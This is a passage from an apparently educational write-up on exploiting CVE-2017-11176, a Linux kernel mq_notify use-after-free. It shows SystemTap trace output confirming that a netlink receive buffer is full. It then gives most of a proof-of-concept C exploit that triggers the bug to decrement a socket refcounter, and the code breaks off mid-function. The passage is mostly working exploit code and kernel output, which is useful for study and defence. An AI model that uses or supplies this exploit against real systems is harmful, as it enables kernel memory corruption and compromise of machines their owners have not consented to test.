<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">recv_fd</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to prepare block socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Let's check the result with system tap. <strong>From here, System Tap should only be used to observe the kernel, it must not modify anything.</strong> Remember to remove the line that marks the socket as <em>congested</em>, and run it:</p><div class="highlight"><pre><span></span><code><span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>SYSCALL<span class="o">]</span> <span class="o">==</span>&gt;&gt; sendmsg <span class="o">(</span><span class="m">3</span>, 0x7ffe69f94b50, MSG_DONTWAIT<span class="o">)</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>uland<span class="o">]</span> <span class="o">==</span>&gt;&gt; copy_from_user <span class="o">()</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>uland<span class="o">]</span> <span class="o">==</span>&gt;&gt; copy_from_user <span class="o">()</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>uland<span class="o">]</span> <span class="o">==</span>&gt;&gt; copy_from_user <span class="o">()</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> <span class="o">==</span>&gt;&gt; netlink_sendmsg <span class="o">(</span><span class="nv">kiocb</span><span class="o">=</span>0xffff880006137bb8 <span class="nv">sock</span><span class="o">=</span>0xffff88002fdba0c0 <span class="nv">msg</span><span class="o">=</span>0xffff880006137f18 <span class="nv">len</span><span class="o">=</span>0x2800<span class="o">)</span>
<span class="o">(</span><span class="nv">socket</span><span class="o">=</span>0xffff88002fdba0c0<span class="o">)</span>-&gt;sk-&gt;sk_refcnt <span class="o">=</span> <span class="m">1</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> <span class="o">==</span>&gt;&gt; netlink_autobind <span class="o">(</span><span class="nv">sock</span><span class="o">=</span>0xffff88002fdba0c0<span class="o">)</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">netlink_autobind</span> <span class="o">=</span> <span class="m">0</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>skb<span class="o">]</span> <span class="o">==</span>&gt;&gt; alloc_skb <span class="o">(</span><span class="nv">priority</span><span class="o">=</span>0xd0 <span class="nv">size</span><span class="o">=</span>?<span class="o">)</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>skb<span class="o">]</span> <span class="o">==</span>&gt;&gt; skb_put <span class="o">(</span><span class="nv">skb</span><span class="o">=</span>0xffff88003d298840 <span class="nv">len</span><span class="o">=</span>0x2800<span class="o">)</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>skb<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">skb_put</span> <span class="o">=</span> ffff880006150000
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>iovec<span class="o">]</span> <span class="o">==</span>&gt;&gt; memcpy_fromiovec <span class="o">(</span><span class="nv">kdata</span><span class="o">=</span>0xffff880006150000 <span class="nv">iov</span><span class="o">=</span>0xffff880006137da8 <span class="nv">len</span><span class="o">=</span>0x2800<span class="o">)</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>uland<span class="o">]</span> <span class="o">==</span>&gt;&gt; copy_from_user <span class="o">()</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>iovec<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">memcpy_fromiovec</span> <span class="o">=</span> <span class="m">0</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> <span class="o">==</span>&gt;&gt; netlink_unicast <span class="o">(</span><span class="nv">ssk</span><span class="o">=</span>0xffff880006173c00 <span class="nv">skb</span><span class="o">=</span>0xffff88003d298840 <span class="nv">pid</span><span class="o">=</span>0x76 <span class="nv">nonblock</span><span class="o">=</span>0x40<span class="o">)</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> <span class="o">==</span>&gt;&gt; netlink_lookup <span class="o">(</span><span class="nv">pid</span><span class="o">=</span>? <span class="nv">protocol</span><span class="o">=</span>? <span class="nv">net</span><span class="o">=</span>?<span class="o">)</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>sk<span class="o">]</span> <span class="o">==</span>&gt;&gt; sk_filter <span class="o">(</span><span class="nv">sk</span><span class="o">=</span>0xffff88002f89ac00 <span class="nv">skb</span><span class="o">=</span>0xffff88003d298840<span class="o">)</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>sk<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">sk_filter</span> <span class="o">=</span> <span class="m">0</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> <span class="o">==</span>&gt;&gt; netlink_attachskb <span class="o">(</span><span class="nv">sk</span><span class="o">=</span>0xffff88002f89ac00 <span class="nv">skb</span><span class="o">=</span>0xffff88003d298840 <span class="nv">timeo</span><span class="o">=</span>0xffff880006137ae0 <span class="nv">ssk</span><span class="o">=</span>0xffff880006173c00<span class="o">)</span>
-<span class="o">={</span> dump_netlink_sock: 0xffff88002f89ac00 <span class="o">}=</span>-
- <span class="nv">sk</span> <span class="o">=</span> 0xffff88002f89ac00
- sk-&gt;sk_rmem_alloc <span class="o">=</span> <span class="m">0</span>                               // &lt;-----
- sk-&gt;sk_rcvbuf <span class="o">=</span> <span class="m">2312</span>                                // &lt;-----
- sk-&gt;sk_refcnt <span class="o">=</span> <span class="m">3</span>
- nlk-&gt;state <span class="o">=</span> <span class="m">0</span>
- sk-&gt;sk_flags <span class="o">=</span> <span class="m">100</span>
-<span class="o">={</span> dump_netlink_sock: END<span class="o">}=</span>-
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">netlink_attachskb</span> <span class="o">=</span> <span class="m">0</span>
-<span class="o">={</span> dump_netlink_sock: 0xffff88002f89ac00 <span class="o">}=</span>-
- <span class="nv">sk</span> <span class="o">=</span> 0xffff88002f89ac00
- sk-&gt;sk_rmem_alloc <span class="o">=</span> <span class="m">10504</span>                           // &lt;-----
- sk-&gt;sk_rcvbuf <span class="o">=</span> <span class="m">2312</span>                                // &lt;-----
- sk-&gt;sk_refcnt <span class="o">=</span> <span class="m">3</span>
- nlk-&gt;state <span class="o">=</span> <span class="m">0</span>
- sk-&gt;sk_flags <span class="o">=</span> <span class="m">100</span>
-<span class="o">={</span> dump_netlink_sock: END<span class="o">}=</span>-
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">netlink_unicast</span> <span class="o">=</span> <span class="m">2800</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">netlink_sendmsg</span> <span class="o">=</span> <span class="m">2800</span>
<span class="o">(</span><span class="m">2768</span>-2768<span class="o">)</span> <span class="o">[</span>SYSCALL<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">sendmsg</span><span class="o">=</span> <span class="m">10240</span>
</code></pre></div><p><strong>Awesome! We now satisfy the "receive buffer full" condition (<em>sk_rmem_alloc &gt; sk_rcvbuf</em>). That is, the next call to <em>mq_attachskb()</em> will returns 1!</strong></p><p>Let's update the TODO list:</p><ol><li>[DONE] Force netlink_attachskb() to return 1</li><li>[DONE] Unblock the exploit thread</li><li>[DONE] Force the second fget() call to return NULL</li></ol><p>Are we done? Almost...</p><h1 id="final-proof-of-concept-code">Final Proof-Of-Concept Code</h1><p>In the last three sections, we implemented every condition needed to trigger the bug using only <em>userland code</em>. Before showing the final <em>proof-of-concept</em> code, there is <strong>one more thing to do</strong>.</p><p>While trying to fill the receive buffer, we saw that the refcounter has been increased by one during netlink_bind() because of netlink_insert(). It means that <em>before</em> entering <em>mq_notify()</em> the refcounter is set to two (instead of one).</p><p>Since the bug gives us a <em>primitive</em> that decreases a <em>netlink_sock</em> refcounter by 1, we need to <strong>trigger the bug twice</strong>!</p><p>Before triggering the bug, we used <em>dup()</em> to have a way to unblock the main thread. We will need to use it <em>again</em> (because the old one is closed), so we can keep one fd to unblock and another one to trigger the bug.</p><p><strong>"<em>Show me the code!</em>"</strong></p><p>Alright, here is the final PoC (don't run system tap):</p><div class="highlight"><pre><span></span><code><span class="cm">/*</span>
<span class="cm"> * CVE-2017-11176 Proof-of-concept code by LEXFO.</span>
<span class="cm"> *</span>
<span class="cm"> * Compile with:</span>
<span class="cm"> *</span>
<span class="cm"> *  gcc -fpic -O0 -std=c99 -Wall -pthread exploit.c -o exploit</span>
<span class="cm"> */</span><span class="w"></span>

<span class="cp">#define _GNU_SOURCE</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;asm/types.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;mqueue.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/netlink.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;pthread.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;errno.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdbool.h&gt;</span><span class="cp"></span>

<span class="c1">// ============================================================================</span>
<span class="c1">// ----------------------------------------------------------------------------</span>
<span class="c1">// ============================================================================</span>

<span class="cp">#define NOTIFY_COOKIE_LEN (32)</span>
<span class="cp">#define SOL_NETLINK (270) </span><span class="c1">// from [include/linux/socket.h]</span>

<span class="c1">// ----------------------------------------------------------------------------</span>

<span class="c1">// avoid library wrappers</span>
<span class="cp">#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)</span>
<span class="cp">#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)</span>
<span class="cp">#define _setsockopt(sockfd, level, optname, optval, optlen) \</span>
<span class="cp">  syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)</span>
<span class="cp">#define _getsockopt(sockfd, level, optname, optval, optlen) \</span>
<span class="cp">  syscall(__NR_getsockopt, sockfd, level, optname, optval, optlen)</span>
<span class="cp">#define _dup(oldfd) syscall(__NR_dup, oldfd)</span>
<span class="cp">#define _close(fd) syscall(__NR_close, fd)</span>
<span class="cp">#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)</span>
<span class="cp">#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)</span>

<span class="c1">// ----------------------------------------------------------------------------</span>

<span class="cp">#define PRESS_KEY() \</span>
<span class="cp">  do { printf("[ ] press key to continue...\n"); getchar(); } while(0)</span>

<span class="c1">// ============================================================================</span>
<span class="c1">// ----------------------------------------------------------------------------</span>
<span class="c1">// ============================================================================</span>

<span class="k">struct</span> <span class="nc">unblock_thread_arg</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">bool</span><span class="w"> </span><span class="n">is_ready</span><span class="p">;</span><span class="w"> </span><span class="c1">// we can use pthread barrier instead</span>
<span class="p">};</span><span class="w"></span>

<span class="c1">// ----------------------------------------------------------------------------</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="nf">unblock_thread</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">arg</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">unblock_thread_arg</span><span class="w"> </span><span class="o">*</span><span class="n">uta</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">unblock_thread_arg</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">arg</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3535</span><span class="p">;</span><span class="w"> </span><span class="c1">// need to be different than zero</span>

<span class="w">  </span><span class="c1">// notify the main thread that the unblock thread has been created. It *must*</span>
<span class="w">  </span><span class="c1">// directly call mq_notify().</span>
<span class="w">  </span><span class="n">uta</span><span class="o">-&gt;</span><span class="n">is_ready</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span><span class="w"> </span>

<span class="w">  </span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span><span class="w"> </span><span class="c1">// gives some time for the main thread to block</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ][unblock] closing %d fd</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">uta</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">_close</span><span class="p">(</span><span class="n">uta</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ][unblock] unblocking now</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_setsockopt</span><span class="p">(</span><span class="n">uta</span><span class="o">-&gt;</span><span class="n">unblock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">SOL_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_NO_ENOBUFS</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">val</span><span class="p">)))</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[+] setsockopt"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="c1">// ----------------------------------------------------------------------------</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">decrease_sock_refcounter</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="n">pthread_t</span><span class="w"> </span><span class="n">tid</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">sigevent</span><span class="w"> </span><span class="n">sigev</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">unblock_thread_arg</span><span class="w"> </span><span class="n">uta</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">sival_buffer</span><span class="p">[</span><span class="n">NOTIFY_COOKIE_LEN</span><span class="p">];</span><span class="w"></span>

<span class="w">  </span><span class="c1">// initialize the unblock thread arguments</span>
<span class="w">  </span><span class="n">uta</span><span class="p">.</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">uta</span><span class="p">.</span><span class="n">unblock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">uta</span><span class="p">.</span><span class="n">is_ready</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// initialize the sigevent structure</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">sigev</span><span class="p">));</span><span class="w"></span>
<span class="w">  </span><span class="n">sigev</span><span class="p">.</span><span class="n">sigev_notify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SIGEV_THREAD</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">sigev</span><span class="p">.</span><span class="n">sigev_value</span><span class="p">.</span><span class="n">sival_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sival_buffer</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">sigev</span><span class="p">.</span><span class="n">sigev_signo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uta</span><span class="p">.</span><span class="n">sock_fd</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] creating unblock thread...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tid</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">unblock_thread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">uta</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] pthread_create"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">uta</span><span class="p">.</span><span class="n">is_ready</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">false</span><span class="p">)</span><span class="w"> </span><span class="c1">// spinlock until thread is created</span>
<span class="w">    </span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] unblocking thread has been created!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] get ready to block</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">_mq_notify</span><span class="p">((</span><span class="n">mqd_t</span><span class="p">)</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">errno</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">EBADF</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] mq_notify"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] mq_notify succeed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="c1">// ============================================================================</span>
<span class="c1">// ----------------------------------------------------------------------------</span>
<span class="c1">// ============================================================================</span>

<span class="cm">/*</span>
<span class="cm"> * Creates a netlink socket and fills its receive buffer.</span>
<span class="cm"> *</span>
<span class="cm"> * Returns the socket file descriptor or -1 on error.</span>
<span class="cm"> */</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">prepare_blocking_socket</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">send_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">recv_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="o">*</span><span class="mi">10</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">new_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// this will be reset to SOCK_MIN_RCVBUF</span>

<span class="w">  </span><span class="k">struct</span> <span class="nc">sockaddr_nl</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_pad</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">118</span><span class="p">,</span><span class="w"> </span><span class="c1">// must different than zero</span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="c1">// no groups</span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>

<span class="w">  </span><span class="k">struct</span> <span class="nc">iovec</span><span class="w"> </span><span class="n">iov</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">iov_base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">iov_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>

<span class="w">  </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="n">mhdr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_namelen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">),</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_iov</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">iov</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_iovlen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_control</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_controllen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">msg_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] preparing blocking netlink socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">send_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_USERSOCK</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"></span>
<span class="w">      </span><span class="p">(</span><span class="n">recv_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_USERSOCK</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"socket"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] socket created (send_fd = %d, recv_fd = %d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">send_fd</span><span class="p">,</span><span class="w"> </span><span class="n">recv_fd</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">_bind</span><span class="p">(</span><span class="n">recv_fd</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">errno</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">EADDRINUSE</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] bind"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="n">addr</span><span class="p">.</span><span class="n">nl_pid</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

